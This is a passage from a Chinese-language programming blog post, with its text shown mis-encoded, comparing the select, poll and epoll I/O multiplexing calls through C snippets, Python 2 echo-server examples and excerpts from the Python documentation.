å…¥å¥—æ¥å­—å¯¹è±¡ï¼Œå‡½æ•°ä¼šè‡ªåŠ¨è°ƒç”¨å¥—æ¥å­—å¯¹è±¡ä¸­çš„<code>fileno</code>æ–¹æ³•æ¥é—´æ¥è·å–<code>fd</code>è¿™ä¸ªå‡½æ•°åœ¨winä¸‹ä¸èƒ½æ¥å—å¯¹è±¡ç±»å‹é™¤äº†å¥—æ¥å­—å¯¹è±¡(ä¹Ÿå°±æ˜¯æ™®é€šçš„é‚£ç§æ–‡ä»¶å¯¹è±¡ä¸è¡Œäº†)ã€‚ç„¶åè¶…æ—¶å‚æ•°é»˜è®¤æ˜¯æ— é™ä¹…ä¹Ÿå°±æ˜¯é˜»å¡ï¼Œå¦‚æœè®¾ç½®è¶…æ—¶æ—¶é—´ï¼Œè‹¥åœ¨æ—¶é—´å†…æ²¡æœ‰è·å–åˆ°å°±ä¼šè¿”å›ç©ºListã€‚é‚£ä¹ˆä¹Ÿå°±é¡ºä¾¿å¾—çŸ¥<code>select()</code>è¿”å›çš„ç±»å‹æ˜¯ä¸‰ä¸ªListã€‚ç‰¹åˆ«çš„å¦‚æœè¶…æ—¶æ—¶é—´ä¸º0ï¼Œåˆ™è¡¨ç¤ºç›´æ¥ä¸é˜»å¡ï¼Œè¯´æ˜è¿™æ˜¯ä¸€ä¸ªpollã€‚åŒæ—¶<code>select()</code>ä¹Ÿæ˜¯<code>select pool epool</code>ä¸­å”¯ä¸€å¯ä»¥åœ¨winä¸Šç”¨çš„å‡½æ•°ã€‚å¯èƒ½æ˜¯å› ä¸ºwinä¸‹çš„I/Oæ¨¡å‹ä¸åŒå¯¼è‡´çš„ã€‚</p><p>çœ‹äº†åˆ«äººçš„è§†å±æ•™ç¨‹æˆ‘åè€Œè§‰å¾—<code>select()</code>çš„ç”¨æ³•æ›´é€‚åˆç”¨Cæ¥å±•ç°</p><p>å…ˆçœ‹<code>select()</code>çš„å‡½æ•°åŸå‹</p><pre><code class="c"> int select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout);</code></pre><p>å¯ä»¥çœ‹åˆ°<code>select()</code>å‡½æ•°æ¥å—ä¸€ä¸ªæœ€å¤§æ–‡ä»¶æè¿°ç¬¦ï¼Œå¦ä¸‰ä¸ªä¸»è¦å‚æ•°æ˜¯å­˜å‚¨äº†æ–‡ä»¶æè¿°ç¬¦çš„bitmapåˆ†åˆ«è¡¨ç¤ºè¯»ï¼Œå†™ï¼Œå¼‚å¸¸ï¼Œå’Œè¶…æ—¶æ—¶é—´</p><p>å†çœ‹ä¸‹ä»¥socketä¸ºä¾‹å­çš„ä»£ç </p><pre><code class="c">  fd_set rset;  sockfd = socket(AF_INET, SOCK_STREAM, 0);  memset(&amp;addr, 0, sizeof (addr));  addr.sin_family = AF_INET;  addr.sin_port = htons(2000);  addr.sin_addr.s_addr = INADDR_ANY;  bind(sockfd,(struct sockaddr*)&amp;addr ,sizeof(addr));  listen (sockfd, 5);    for (i=0;i&lt;5;i++)   &#123;    memset(&amp;client, 0, sizeof (client));    addrlen = sizeof(client);    fds[i] = accept(sockfd,(struct sockaddr*)&amp;client, &amp;addrlen);    if(fds[i] &gt; max)        max = fds[i];  &#125;    while(1)&#123;    FD_ZERO(&amp;rset);      for (i = 0; i&lt; 5; i++ ) &#123;          FD_SET(fds[i],&amp;rset);      &#125;        puts(&quot;round again&quot;);    select(max+1, &amp;rset, NULL, NULL, NULL);     for(i=0;i&lt;5;i++) &#123;        if (FD_ISSET(fds[i], &amp;rset))&#123;            memset(buffer,0,MAXBUF);            read(fds[i], buffer, MAXBUF);            puts(buffer);        &#125;    &#125;      &#125;</code></pre><p>é¦–å…ˆæ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ™®é€šçš„TCPç›‘å¬socketè®¾ç½®äº†æœ€å¤§ç›‘å¬é‡æ˜¯5ï¼Œå¾ªç¯acceptï¼Œç›´åˆ°å»ºç«‹äº†5ä¸ªè¿æ¥çš„å¥—æ¥å­—ï¼Œè¿™é‡Œæ³¨æ„cè¯­è¨€acceptè¿”å›çš„å°±ç›´æ¥æ˜¯ä¸€ä¸ª<code>int</code>ç±»å‹çš„<code>fd</code>(æ–‡ä»¶æè¿°ç¬¦)è€Œä¸æ˜¯Pythonä¸­çš„socketå¯¹è±¡ã€‚ç„¶åè®°å½•ä¸‹äº†æ–‡ä»¶æè¿°ç¬¦çš„æœ€å¤§å€¼ã€‚ç„¶åæŠŠæ–‡ä»¶æè¿°ç¬¦æ”¾åˆ°ä¸€ä¸ªbitmapé‡Œå»ä¹Ÿå°±æ˜¯<code>FD_SET(fds[i],&amp;rset);</code>bitmapçš„ç»“æ„ç±»ä¼¼ä¸€ä¸ªæ•°ç»„ï¼Œé»˜è®¤å€¼å…¨æ˜¯0ï¼Œè‹¥æ”¶åˆ°çš„5ä¸ª<code>fd</code>åˆ†åˆ«ä¸º 1 2 3 4 5åˆ™ä¼šåœ¨bitmapä¸­æŠŠå¯¹åº”çš„1 2 3 4 5ä½ç”±0å˜æˆ1ã€‚ç„¶åè°ƒç”¨<code>select()</code>å‡½æ•°ï¼Œä¼ å…¥å‚æ•°æœ€å¤§çš„<code>fd+1</code>(å…·ä½“ä¸ºå•¥è¦åŠ 1å¯ä»¥è®¤ä¸ºæ˜¯bitmapæ˜¯ä¸€ä¸ªæ•°ç»„ä»0å­˜å‚¨æ‰€ä»¥éœ€è¦åŠ 1)å’Œå‚¨å­˜äº†æ–‡ä»¶æè¿°ç¬¦çš„bitmapã€‚å½“<code>select()</code>è¿”å›è¯´æ˜æœ‰socketå¯ä»¥æ¥å—æ•°æ®äº†ï¼Œè¿™ä¸­é—´å…¶å®æ˜¯ç”¨æˆ·æ€æŠŠbitmapåˆ©ç”¨<code>mmap</code>æ˜ å°„åˆ°å†…æ ¸ï¼Œç„¶åç”±å†…æ ¸è½®è¯¢ç›´åˆ°å‘ç°æœ‰æ•°æ®æ¥äº†ï¼Œä¾¿ä¼šå¯¹bitmapä¸­çš„æè¿°ç¬¦ç½®ä½ä¹Ÿå°±æ˜¯ç±»ä¼¼æ’ä¸€ä¸ªå°æ——å­(flag)è¡¨æ˜æ˜¯è¿™ä¸ª<code>fd</code>æœ‰æ•°æ®æ¥äº†ï¼Œä¾¿è¿›è¡Œéå†åˆ¤æ–­æ˜¯å“ªä¸€ä½å˜äº†ï¼Œç„¶åè¿›è¡Œè¯»å–ã€‚è¿™æœ€åéå†è¿™éƒ¨åœ¨pythonä¸­ä¼¼ä¹è¢«ç›´æ¥å®Œæˆäº†ï¼Œå› ä¸ºpythonçš„selectæ˜¯æœ‰è¿”å›å€¼çš„ï¼Œè¿”å›çš„ä¾¿æ˜¯å¯ä»¥<code>recv()</code>çš„å¥—æ¥å­—å¯¹è±¡ã€‚ä»è¿™é‡Œä¹Ÿèƒ½çœ‹å‡ºPythonæ˜¯é«˜åº¦å°è£…çš„è¯­è¨€ï¼Œå®ƒæŠŠè¿™ç§ç»†èŠ‚å°è£…èµ·æ¥ï¼Œä½¿å¾—æˆ‘ä»¬å†™ä»£ç ä¸å¿…åœ¨æ„ç»†ææœ«èŠ‚ã€‚è€Œcè™½ç„¶ç•¥æ˜¾å¤æ‚ï¼Œå´èƒ½å¾ˆå¥½å±•ç¤º<code>select()</code>çš„å¤„ç†è¿‡ç¨‹ã€‚</p><p>ä¼˜ç‚¹ï¼š1) åœ¨cè¯­è¨€ä¸­å®ƒçš„ä¼˜ç‚¹å°±æ˜¯å®ƒè½®è¯¢çš„è¿‡ç¨‹(æ£€æµ‹socketæ˜¯å¦æœ‰æ•°æ®å¯æ¥å—)æ˜¯åœ¨å†…æ ¸ä¸­è¿›è¡Œï¼Œè€Œéæˆ‘è‡ªå·±ç”¨ä¸€ä¸ªéé˜»å¡IOå»while Trueå¾ªç¯æ¥åå¤è¿›è¡Œç”¨æˆ·æ€-å†…æ ¸æ€åˆ‡æ¢æ¥å ç”¨å¼€é”€ã€‚</p><p>ç¼ºç‚¹ï¼Œ1)åœ¨32ä½ä¸‹bitmapå¤§å°é»˜è®¤æ˜¯1024åœ¨64ä½ä¸‹æ˜¯2048ä¹Ÿå°±æ˜¯bitmapå¤§å°å—é™ 2)åœ¨æ¯æ¬¡selectåè¿˜å¾—æ‰‹åŠ¨éå†ï¼Œæœ‰O(n)å¤æ‚åº¦</p><p>Pythonæ ·ä¾‹ä»£ç </p><pre><code class="python">#!/usr/bin/python# -*- coding: utf-8 -*-import selectimport socketimport Queueserver = socket.socket(socket.AF_INET,socket.SOCK_STREAM)server.setblocking(False)server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR  , 1)server_address= (&#39;192.168.1.5&#39;,8080)server.bind(server_address)server.listen(10)#selectè½®è¯¢ç­‰å¾…è¯»socketé›†åˆinputs = [server]#selectè½®è¯¢ç­‰å¾…å†™socketé›†åˆoutputs = []message_queues = &#123;&#125;#selectè¶…æ—¶æ—¶é—´timeout = 20while True:    print &quot;ç­‰å¾…æ´»åŠ¨è¿æ¥......&quot;    readable , writable , exceptional = select.select(inputs, outputs, inputs, timeout)    if not (readable or writable or exceptional) :        print &quot;selectè¶…æ—¶æ— æ´»åŠ¨è¿æ¥ï¼Œé‡æ–°select...... &quot;        continue;    #å¾ªç¯å¯è¯»äº‹ä»¶    for s in readable :        #å¦‚æœæ˜¯serverç›‘å¬çš„socket        if s is server:            #åŒæ„è¿æ¥            connection, client_address = s.accept()            print &quot;æ–°è¿æ¥ï¼š &quot;, client_address            connection.setblocking(0)            #å°†è¿æ¥åŠ å…¥åˆ°selectå¯è¯»äº‹ä»¶é˜Ÿåˆ—            inputs.append(connection)            #æ–°å»ºè¿æ¥ä¸ºkeyçš„å­—å…¸ï¼Œå†™å›è¯»å–åˆ°çš„æ¶ˆæ¯            message_queues[connection] = Queue.Queue()        else:            #ä¸æ˜¯æœ¬æœºç›‘å¬å°±æ˜¯å®¢æˆ·ç«¯å‘æ¥çš„æ¶ˆæ¯            data = s.recv(1024)            if data :                print &quot;æ”¶åˆ°æ•°æ®ï¼š&quot; , data , &quot;å®¢æˆ·ç«¯ï¼š&quot;,s.getpeername()                message_queues[s].put(data)                if s not in outputs:                    #å°†è¯»å–åˆ°çš„socketåŠ å…¥åˆ°å¯å†™äº‹ä»¶é˜Ÿåˆ—                    outputs.append(s)            else:                #ç©ºç™½æ¶ˆæ¯ï¼Œå…³é—­è¿æ¥                print &quot;å…³é—­è¿æ¥ï¼š&quot;, client_address                if s in outputs :                    outputs.remove(s)                inputs.remove(s)                s.close()                del message_queues[s]    for s in writable:        try:            msg = message_queues[s].get_nowait()        except Queue.Empty:            print &quot;è¿æ¥ï¼š&quot; , s.getpeername() , &#39;æ¶ˆæ¯é˜Ÿåˆ—ä¸ºç©º&#39;            outputs.remove(s)        else:            print &quot;å‘é€æ•°æ®ï¼š&quot; , msg , &quot;åˆ°&quot;, s.getpeername()            s.send(msg)    for s in exceptional:        print &quot;å¼‚å¸¸è¿æ¥ï¼š&quot;, s.getpeername()        inputs.remove(s)        if s in outputs:            outputs.remove(s)        s.close()        del message_queues[s]</code></pre><h2 id="poll"><a href="#poll" class="headerlink" title="poll"></a>poll</h2><ul><li><p>pool( )</p><pre><code>The poll() system call, supported on most Unix systems, provides better scalability for network servers that service many, many clients at the same time. poll() scales better because the system call only requires listing the file descriptors of interest, while select() builds a bitmap, turns on bits for the fds of interest, and then afterward the whole bitmap has to be linearly scanned again. select() is O(highest file descriptor), while poll() is O(number of file descriptors)</code></pre><p>åœ¨pythonæ–‡æ¡£é‡Œä¹Ÿç›´æ¥è®²æ˜äº†æ•ˆç‡çš„å·®å¼‚åœ¨å¤§éƒ¨åˆ†æƒ…å†µä¸‹pollæ¯”selectæ›´å¥½ã€‚å› ä¸º<code>poll()</code>çš„ç³»ç»Ÿè°ƒç”¨åªéœ€è¦ä¸€ä¸ªæ„Ÿå…´è¶£ä¹Ÿå°±æ˜¯éœ€è¦ç›‘å¬çš„æ–‡ä»¶æè¿°ç¬¦æ¸…å•ã€‚è€Œéæ˜¯åƒ<code>select()</code>ä¸€æ ·éœ€è¦å»ºç«‹ä¸€ä¸ªbitmapå¹¶ä¸”éœ€è¦å¯¹æ•´ä¸ªbitmapè¿›è¡Œçº¿æ€§æ‰«æã€‚</p><p>å…ˆçœ‹çœ‹<code>poll()</code>çš„cè¯­è¨€å‡½æ•°åŸå‹</p><pre><code class="c">int poll (struct pollfd *fds, unsigned int nfds, int timeout);</code></pre></li></ul><p>æ˜æ˜¾æ¯”<code>select()</code>ç®€æ´ä¸å°‘ï¼Œå®ƒæ¥æ”¶ä¸€ä¸ªæœ‰å…³æ–‡ä»¶æè¿°ç¬¦çš„ç»“æ„ä½“ï¼Œä¸€ä¸ªæ­£æ•´æ•°è¡¨ç¤ºæ–‡ä»¶æè¿°ç¬¦æ•°é‡ï¼Œå’Œä¸€ä¸ªè¶…æ—¶æ—¶é—´</p><p>å†çœ‹ä¸‹æ ·ä¾‹ä»£ç </p><pre><code class="c">struct pollfd &#123;      int fd;      short events;       short revents;&#125;;for (i=0;i&lt;5;i++)   &#123;    memset(&amp;client, 0, sizeof (client));    addrlen = sizeof(client);    pollfds[i].fd = accept(sockfd,(struct sockaddr*)&amp;client, &amp;addrlen);    pollfds[i].events = POLLIN;  &#125;  sleep(1);  while(1)&#123;      puts(&quot;round again&quot;);    poll(pollfds, 5, 50000);     for(i=0;i&lt;5;i++) &#123;        if (pollfds[i].revents &amp; POLLIN)&#123;            pollfds[i].revents = 0;            memset(buffer,0,MAXBUF);            read(pollfds[i].fd, buffer, MAXBUF);            puts(buffer);        &#125;    &#125;  &#125;</code></pre><p>å¯¹äºæ¯ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œæˆ‘ä»¬éƒ½ä¸ºå…¶åˆ›å»ºä¸€ä¸ªpollfdå¯¹è±¡ï¼Œå…¶ä¸­fdå‚æ•°å°±æ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼Œeventsè¡¨ç¤ºpolläº‹ä»¶ï¼Œæ˜¯é¢„å®šå¥½çš„</p><table><thead><tr><th>äº‹ä»¶</th><th>æè¿°</th><th>æ˜¯å¦å¯ä½œä¸ºè¾“å…¥ï¼ˆeventsï¼‰</th><th>æ˜¯å¦å¯ä½œä¸ºè¾“å‡ºï¼ˆreventsï¼‰</th></tr></thead><tbody><tr><td>POLLIN</td><td>æ•°æ®å¯è¯»ï¼ˆåŒ…æ‹¬æ™®é€šæ•°æ®&amp;ä¼˜å…ˆæ•°æ®ï¼‰</td><td>æ˜¯</td><td>æ˜¯</td></tr><tr><td>POLLOUT</td><td>æ•°æ®å¯å†™ï¼ˆæ™®é€šæ•°æ®&amp;ä¼˜å…ˆæ•°æ®ï¼‰</td><td>æ˜¯</td><td>æ˜¯</td></tr><tr><td>POLLRDNORM</td><td>æ™®é€šæ•°æ®å¯è¯»</td><td>æ˜¯</td><td>æ˜¯</td></tr><tr><td>POLLRDBAND</td><td>ä¼˜å…ˆçº§å¸¦æ•°æ®å¯è¯»ï¼ˆlinuxä¸æ”¯æŒï¼‰</td><td>æ˜¯</td><td>æ˜¯</td></tr><tr><td>POLLPRI</td><td>é«˜ä¼˜å…ˆçº§æ•°æ®å¯è¯»ï¼Œæ¯”å¦‚TCPå¸¦å¤–æ•°æ®</td><td>æ˜¯</td><td>æ˜¯</td></tr><tr><td>POLLWRNORM</td><td>æ™®é€šæ•°æ®å¯å†™</td><td>æ˜¯</td><td>æ˜¯</td></tr><tr><td>POLLWRBAND</td><td>ä¼˜å…ˆçº§å¸¦æ•°æ®å¯å†™</td><td>æ˜¯</td><td>æ˜¯</td></tr><tr><td>POLLRDHUP</td><td>TCPè¿æ¥è¢«å¯¹ç«¯å…³é—­ï¼Œæˆ–è€…å…³é—­äº†å†™æ“ä½œï¼Œç”±GNUå¼•å…¥</td><td>æ˜¯</td><td>æ˜¯</td></tr><tr><td>POPPHUP</td><td>æŒ‚èµ·</td><td>å¦</td><td>æ˜¯</td></tr><tr><td>POLLERR</td><td>é”™è¯¯</td><td>å¦</td><td>æ˜¯</td></tr><tr><td>POLLNVAL</td><td>æ–‡ä»¶æè¿°ç¬¦æ²¡æœ‰æ‰“å¼€</td><td>å¦</td><td>æ˜¯</td></tr></tbody></table><p>è°ƒç”¨<code>poll()</code>åé˜»å¡ï¼Œè‹¥è¿”å›åªéœ€è¦éå†éå†æ–‡ä»¶æè¿°ç¬¦æ•°é‡ï¼Œå°†å…¶<code>revents</code>é‡ç½®ä¸º0ï¼Œå¹¶å¯¹å¯¹åº”fdè¿›è¡Œè¯»å–ã€‚</p><h4 id="Poll-vs-Select"><a href="#Poll-vs-Select" class="headerlink" title="Poll vs Select"></a>Poll vs Select</h4><ul><li>poll( ) does not require that the user calculate the value of the highest- numbered file descriptor +1</li><li>poll( ) is more efficient for large-valued file descriptors. Imagine watching a single file descriptor with the value 900 via select()â€”the  kernel would have to check each bit of each passed-in set, up to the  900th bit.</li><li>select( )â€™s file descriptor sets are statically sized.</li><li>With select( ), the file descriptor sets are reconstructed on  return, so each subsequent call must reinitialize them. The poll( )  system call separates the input (events field) from the output (revents  field), allowing the array to be reused without change.</li><li>The timeout parameter to select( ) is undefined on return. Portable  code needs to reinitialize it. This is not an issue with pselect( )</li><li>select( ) is more portable, as some Unix systems do not support poll( )</li></ul><p>è¿™é‡Œå…¶å®è¿˜æœ‰ä¸€ç‚¹ï¼Œç›¸è¾ƒäºä¹‹å‰çš„selectï¼Œselectæ¯æ¬¡éœ€è¦æ„å»ºä¸€ä¸ªbitmapï¼Œå½“æ¯æ¬¡selectè¿”å›åï¼Œç”±äºå†…æ ¸çš„ç½®ä½ï¼Œå¯¼è‡´bitmapè¢«ç›´æ¥æ›´æ”¹äº†ï¼Œæ‰€ä»¥å†ä¸‹æ¬¡selectå‰ï¼Œå¿…é¡»é‡æ–°åˆå§‹åŒ–bitmapã€‚è¿™å°±é€ æˆå…¶é‡ç”¨æ€§è¾ƒå·®ã€‚ä½†æ˜¯pollå°±ä¸ä¸€æ ·ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨å¤„ç†æ–‡ä»¶æè¿°ç¬¦çš„æ—¶å€™é¡ºæ‰‹æŠŠreventsç»™é‡æ–°å˜ä¸º0å³å¯ã€‚è¿˜æœ‰ä¸€ç‚¹å°±æ˜¯selectçš„bitmapåœ¨è¢«è¿”å›å‰æ‰€æœ‰æ²¡æ”¶åˆ°æ•°æ®çš„ä½éƒ½è¢«ç½®ä¸º0ï¼Œæ‰€ä»¥ç›¸å½“äºå…¶æœ¬èº«è¢«æ”¹å˜äº†ï¼Œæ‰€ä»¥æ²¡æ³•ç±»ä¼¼pollè¿™æ ·ç»™å®ƒå˜ä¸º0ï¼Œåªèƒ½ä¹–ä¹–é‡æ–°ç”Ÿæˆã€‚</p><p>å†çœ‹Pythonå¯¹pollæè¿°çš„å®˜æ–¹æ–‡æ¡£</p><ul><li><p><code>poll.register</code>(<em>fd</em>[, <em>eventmask</em>])</p><p>Register a file descriptor with the polling object.  Future calls to the <a href="https://docs.python.org/3/library/select.html#select.poll"><code>poll()</code></a> method will then check whether the file descriptor has any pending I/O events.  <em>fd</em> can be either an integer, or an object with a <a href="https://docs.python.org/3/library/io.html#io.IOBase.fileno"><code>fileno()</code></a> method that returns an integer.  File objects implement <code>fileno()</code>, so they can also be used as the argument. <em>eventmask</em> is an optional bitmask describing the type of events you want to check for, and can be a combination of the constants <code>POLLIN</code>, <code>POLLPRI</code>, and <code>POLLOUT</code>, described in the table below.  If not specified, the default value used will check for all 3 types of events.    Constant Meaning  <code>POLLIN</code> There is data to read <code>POLLPRI</code> There is urgent data to read <code>POLLOUT</code> Ready for output: writing will not block <code>POLLERR</code> Error condition of some sort <code>POLLHUP</code> Hung up <code>POLLRDHUP</code> Stream socket peer closed connection, or shut down writing half of connection <code>POLLNVAL</code> Invalid request: descriptor not open  Registering a file descriptor thatâ€™s already registered is not an error, and has the same effect as registering the descriptor exactly once.</p></li><li><p><code>poll.modify</code>(<em>fd</em>, <em>eventmask</em>)</p><p>Modifies an already registered fd. This has the same effect as <code>register(fd, eventmask)</code>.  Attempting to modify a file descriptor that was never registered causes an <a href="https://docs.python.org/3/library/exceptions.html#OSError"><code>OSError</code></a> exception with errno <code>ENOENT</code> to be raised.</p><table><thead><tr><th>Constant</th><th>Meaning</th></tr></thead><tbody><tr><td><code>POLLIN</code></td><td>There is data to read</td></tr><tr><td><code>POLLPRI</code></td><td>There is urgent data to read</td></tr><tr><td><code>POLLOUT</code></td><td>Ready for output: writing will not block</td></tr><tr><td><code>POLLERR</code></td><td>Error condition of some sort</td></tr><tr><td><code>POLLHUP</code></td><td>Hung up</td></tr><tr><td><code>POLLRDHUP</code></td><td>Stream socket peer closed connection, or shut down writing half of connection</td></tr><tr><td><code>POLLNVAL</code></td><td>Invalid request: descriptor not open</td></tr></tbody></table></li><li><p><code>poll.unregister</code>(<em>fd</em>)</p><p>Remove a file descriptor being tracked by a polling object.  Just like the <a href="https://docs.python.org/3/library/select.html#select.poll.register"><code>register()</code></a> method, <em>fd</em> can be an integer or an object with a <a href="https://docs.python.org/3/library/io.html#io.IOBase.fileno"><code>fileno()</code></a> method that returns an integer. Attempting to remove a file descriptor that was never registered causes a <a href="https://docs.python.org/3/library/exceptions.html#KeyError"><code>KeyError</code></a> exception to be raised.</p></li><li><p><code>poll.poll</code>([<em>timeout</em>])</p><p>Polls the set of registered file descriptors, and returns a possibly-empty list containing <code>(fd, event)</code> 2-tuples for the descriptors that have events or errors to report. <em>fd</em> is the file descriptor, and <em>event</em> is a bitmask with bits set for the reported events for that descriptor â€” <code>POLLIN</code> for waiting input, <code>POLLOUT</code> to indicate that the descriptor can be written to, and so forth. An empty list indicates that the call timed out and no file descriptors had any events to report. If <em>timeout</em> is given, it specifies the length of time in milliseconds which the system will wait for events before returning. If <em>timeout</em> is omitted, negative, or <a href="https://docs.python.org/3/library/constants.html#None"><code>None</code></a>, the call will block until there is an event for this poll object. Changed in version 3.5: The function is now retried with a recomputed timeout when interrupted by a signal, except if the signal handler raises an exception (see <a href="https://www.python.org/dev/peps/pep-0475"><strong>PEP 475</strong></a> for the rationale), instead of raising <a href="https://docs.python.org/3/library/exceptions.html#InterruptedError"><code>InterruptedError</code></a>.</p><p>é¦–å…ˆéœ€è¦å»<code>poll.register()</code>ä¸€ä¸‹ï¼Œå‚æ•°è‡ªç„¶æ˜¯æ–‡ä»¶æè¿°ç¬¦å’Œeventï¼Œç„¶åç‰¹æ®Šçš„ï¼Œå¦‚æœä¸æŒ‡å®ševentåˆ™ä¼šä¸‰ç§eventéƒ½ä¼šè¢«ä½œä¸ºé»˜è®¤å‚æ•°ä¼ å…¥ã€‚<code>poll.modify()</code>å°±æ˜¯å»ä¿®æ”¹å·²ç»è¢«<code>poll.register()</code>çš„æ–‡ä»¶æè¿°ç¬¦ã€‚è‡³äº<code>poll.unregister()</code>å°±ä¸è¯´äº†ï¼Œå–æ¶ˆä¸€ä¸ªå·²ç»æ³¨å†Œçš„æ–‡ä»¶æè¿°ç¬¦ã€‚æœ€åä¸‡äº‹ä¿±å¤‡ï¼Œéƒ½æ³¨å†Œå®Œäº†å°±å»è°ƒç”¨<code>poll.poll()</code>å»ç›‘æµ‹ã€‚å…¶ä¸­çš„è¶…æ—¶é»˜è®¤æ˜¯é˜»å¡ï¼Œå¦‚æœæ˜¾å¼ä¼ å…¥è´Ÿæ•°æˆ–è€…Noneä¹Ÿä¼šæ˜¯é˜»å¡çš„ï¼Œé»˜è®¤å•ä½æ˜¯æ¯«ç§’ã€‚</p><p>Python2æ ·ä¾‹ä»£ç </p><pre><code class="python">#!/usr/bin/python# -*- coding: utf-8 -*-import socketimport selectimport Queueserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)server.setblocking(False)server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)server_address = (&quot;192.168.1.5&quot;, 8080)server.bind(server_address)server.listen(5)print  &quot;æœåŠ¡å™¨å¯åŠ¨æˆåŠŸï¼Œç›‘å¬IPï¼š&quot; , server_addressmessage_queues = &#123;&#125;#è¶…æ—¶ï¼Œæ¯«ç§’timeout = 5000#ç›‘å¬å“ªäº›äº‹ä»¶READ_ONLY = ( select.POLLIN | select.POLLPRI | select.POLLHUP | select.POLLERR)READ_WRITE = (READ_ONLY|select.POLLOUT)#æ–°å»ºè½®è¯¢äº‹ä»¶å¯¹è±¡poller = select.poll()#æ³¨å†Œæœ¬æœºç›‘å¬socketåˆ°ç­‰å¾…å¯è¯»äº‹ä»¶äº‹ä»¶é›†åˆpoller.register(server,READ_ONLY)#æ–‡ä»¶æè¿°ç¬¦åˆ°socketæ˜ å°„fd_to_socket = &#123;server.fileno():server,&#125;while True:    print &quot;ç­‰å¾…æ´»åŠ¨è¿æ¥......&quot;    #è½®è¯¢æ³¨å†Œçš„äº‹ä»¶é›†åˆ    events = poller.poll(timeout)    if not events:      print &quot;pollè¶…æ—¶ï¼Œæ— æ´»åŠ¨è¿æ¥ï¼Œé‡æ–°poll......&quot;      continue    print &quot;æœ‰&quot; , len(events), &quot;ä¸ªæ–°äº‹ä»¶ï¼Œå¼€å§‹å¤„ç†......&quot;    for fd ,flag in events:        s = fd_to_socket[fd]        #å¯è¯»äº‹ä»¶        if flag &amp; (select.POLLIN | select.POLLPRI) :            if s is server :                #å¦‚æœsocketæ˜¯ç›‘å¬çš„serverä»£è¡¨æœ‰æ–°è¿æ¥                connection , client_address = s.accept()                print &quot;æ–°è¿æ¥ï¼š&quot; , client_address                connection.setblocking(False)                fd_to_socket[connection.fileno()] = connection                #åŠ å…¥åˆ°ç­‰å¾…è¯»äº‹ä»¶é›†åˆ                poller.register(connection,READ_ONLY)                message_queues[connection]  = Queue.Queue()            else :                #æ¥æ”¶å®¢æˆ·ç«¯å‘é€çš„æ•°æ®                data = s.recv(1024)                if data:                    print &quot;æ”¶åˆ°æ•°æ®ï¼š&quot; , data , &quot;å®¢æˆ·ç«¯ï¼š&quot; , s.getpeername()                    message_queues[s].put(data)                    #ä¿®æ”¹è¯»å–åˆ°æ¶ˆæ¯çš„è¿æ¥åˆ°ç­‰å¾…å†™äº‹ä»¶é›†åˆ                    poller.modify(s,READ_WRITE)                else :                    # Close the connection                    print &quot;  closing&quot; , s.getpeername()                    # Stop listening for input on the connection                    poller.unregister(s)                    s.close()                    del message_queues[s]        #è¿æ¥å…³é—­äº‹ä»¶        elif flag &amp; select.POLLHUP :            print &quot; Closing &quot;, s.getpeername() ,&quot;(HUP)&quot;            poller.unregister(s)            s.close()        #å¯å†™äº‹ä»¶        elif flag &amp; select.POLLOUT :            try:                msg = message_queues[s].get_nowait()            except Queue.Empty:                print s.getpeername() , &quot; queue empty&quot;                poller.modify(s,READ_ONLY)            else :                print &quot;å‘é€æ•°æ®ï¼š&quot; , data , &quot;å®¢æˆ·ç«¯ï¼š&quot; , s.getpeername()                s.send(msg)        #å¼‚å¸¸äº‹ä»¶        elif flag &amp; select.POLLERR:            print &quot;  exception on&quot; , s.getpeername()            poller.unregister(s)            s.close()            del message_queues[s]</code></pre></li></ul><h2 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h2><p>epollåœ¨cè¯­è¨€ä¸‹ä¸»è¦ç”±ä¸‰ä¸ªæ¯”è¾ƒä¸»è¦çš„å‡½æ•°ç»„æˆ<code>epoll_create()</code>ã€<code>epoll_ctl</code>ã€<code>epoll_wait()</code>ç»„æˆã€‚é™äºç¯‡å¹…åŸå› ï¼Œä¸åˆ—å‡ºå…¶å‡½æ•°åŸå‹ã€‚å¯ä»¥å‚è€ƒ<a href="https://blog.csdn.net/silly1195056983/article/details/112692781">https://blog.csdn.net/silly1195056983/article/details/112692781</a></p><p>çœ‹ä¸‹cè¯­è¨€ç»™çš„æ ·ä¾‹</p><pre><code class="c">struct epoll_event events[5];  int epfd = epoll_create(10);  ...  ...  for (i=0;i&lt;5;i++)   &#123;    static struct epoll_event ev;    memset(&amp;client, 0, sizeof (client));    addrlen = sizeof(client);    ev.data.fd = accept(sockfd,(struct sockaddr*)&amp;client, &amp;addrlen);    ev.events = EPOLLIN;    epoll_ctl(epfd, EPOLL_CTL_ADD, ev.data.fd, &amp;ev);   &#125;    while(1)&#123;      puts(&quot;round again&quot;);      nfds = epoll_wait(epfd, events, 5, 10000);        for(i=0;i&lt;nfds;i++) &#123;            memset(buffer,0,MAXBUF);            read(events[i].data.fd, buffer, MAXBUF);            puts(buffer);    &#125;  &#125;</code></pre><p>å…ˆç”¨<code>epoll_create()</code>åˆ›å»º10ä¸ªä½ç½®ï¼Œç”¨äºç›‘å¬æ–‡ä»¶æè¿°ç¬¦ã€‚å†ç”¨ç±»ä¼¼pollçš„ç»“æ„ä½“å­˜å‚¨fdå’Œç›‘å¬äº‹ä»¶ï¼Œæ³¨æ„è¿™é‡Œæ²¡æœ‰reventsï¼Œç„¶åè°ƒç”¨<code>epoll_ctl()</code>ä¼ å…¥<code>epoll_create()</code>åˆ›å»ºçš„ç›‘å¬åˆ—è¡¨ï¼Œè®¾ç½®å¢åŠ æ“ä½œç±»å‹ï¼Œä¼ 